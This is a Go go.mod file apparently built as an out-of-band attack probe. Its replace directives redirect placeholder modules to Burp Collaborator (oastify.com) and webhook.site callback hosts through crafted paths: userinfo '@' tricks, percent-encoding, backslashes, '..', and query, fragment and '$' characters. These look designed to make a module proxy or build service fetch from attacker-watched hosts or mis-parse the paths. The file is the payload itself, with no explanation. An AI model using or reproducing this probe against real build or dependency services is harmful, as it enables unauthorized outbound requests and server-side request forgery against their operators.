module probe5.mod/z

go 1.21

require (
	ctrl.example/m v1.0.0
	c1.example/m v1.0.0
	c2.example/m v1.0.0
	c3.example/m v1.0.0
	c4.example/m v1.0.0
	c5.example/m v1.0.0
	c6.example/m v1.0.0
	c7.example/m v1.0.0
	c8.example/m v1.0.0
	c9.example/m v1.0.0
	ca.example/m v1.0.0
	cb.example/m v1.0.0
	cc.example/m v1.0.0
	rd.example/m v1.0.0
)

replace ctrl.example/m => github.com/Life-y/ctrlmod v1.0.0

replace c1.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com:8443/port v1.0.0

replace c2.example/m => https://evil.example.com@suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/at v1.0.0

replace c3.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/query?q=1 v1.0.0

replace c4.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/frag#f v1.0.0

replace c5.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/enc%2fslash v1.0.0

replace c6.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/back\\slash v1.0.0

replace c7.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/semi;x v1.0.0

replace c8.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/eq=x v1.0.0

replace c9.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/amp&x v1.0.0

replace ca.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/tab%09x v1.0.0

replace cb.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/dot..dot v1.0.0

replace cc.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/dollar$x v1.0.0

replace rd.example/m => webhook.site/281a394c-7dfa-4c53-9cfd-297e0b0b5ed9 v1.0.0
